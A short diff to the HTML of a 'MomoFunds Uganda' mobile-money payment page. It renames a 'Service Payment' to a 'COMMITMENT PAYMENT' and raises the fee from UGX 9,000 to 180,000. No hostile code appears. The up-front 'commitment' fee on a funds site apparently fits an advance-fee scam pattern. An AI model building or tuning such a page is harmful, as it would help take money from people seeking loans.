@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#FFCC00">
-<title>MomoFunds Uganda – Service Payment</title>
+<title>MomoFunds Uganda – COMMITMENT PAYMENT</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
@@ -168,7 +168,7 @@ gap:8px;
 
 <div class="header">
 <h1>MomoFunds Uganda</h1>
-<p>Service Payment</p>
+<p>COMMITMENT PAYMENT</p>
 <div class="badge">💳</div>
 </div>
 
@@ -199,16 +199,16 @@ Complete payment for your selected service. Your request will continue after pay
 <div class="row">
 <div class="left">
 <div class="icon">📝</div>
-<div>Service</div>
+<div>COMMITMENT</div>
 </div>
-<div class="value" id="serviceName">Selected Service</div>
+<div class="value" id="serviceName">SELECTED COMMITMENT</div>
 </div>
 
 </div>
 
 <div class="payment-box">
 <small>Amount Due</small>
-<strong>UGX <span id="amountDue">9,000</span></strong>
+<strong>UGX <span id="amountDue">180,000</span></strong>
 </div>
 
 <button id="payBtn">Pay with MTN MoMo →</button>
@@ -229,7 +229,7 @@ Complete payment for your selected service. Your request will continue after pay
 "use strict";
 
 const BACKEND_URL="https://https-momo-funds-uganda-onrender-com.onrender.com";
-const SERVICE_AMOUNT=9000;
+const SERVICE_AMOUNT=180000;
 
 document.getElementById("fullName").textContent=
 localStorage.getItem("fullName")||
